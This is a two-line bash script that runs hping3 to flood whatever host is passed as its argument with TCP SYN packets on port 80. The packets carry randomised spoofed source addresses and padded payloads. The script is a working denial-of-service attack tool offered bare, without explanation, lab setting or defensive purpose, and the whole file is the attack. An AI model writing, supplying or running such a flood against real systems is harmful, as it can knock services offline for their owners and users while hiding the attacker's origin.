#!/bin/bash
hping3 --flood --rand-source -d 1460 -S -p 80 "$1"
